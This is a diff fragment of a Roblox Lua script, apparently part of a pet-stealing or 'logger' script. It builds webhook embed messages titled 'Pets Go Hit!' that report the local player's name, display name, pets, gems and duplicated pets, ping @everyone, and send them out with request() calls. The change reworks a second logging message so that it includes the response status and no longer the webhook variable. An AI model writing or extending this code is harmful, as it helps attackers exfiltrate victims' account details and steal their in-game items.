@@ -6,12 +6,6 @@ msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer
 else
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 end
-local log = ""
-if dh then
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'.._G.wh..'"}'
-else
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'.._G.wh..'"}'
-end
 local response =
         request(
         {
@@ -21,6 +15,12 @@ local response =
             Body = msg
         }
     )
+local log = ""
+if dh then
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..response.StatusMessage..'"}'
+else
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..response.StatusMessage..'"}'
+end
 local responser =
         request(
         {
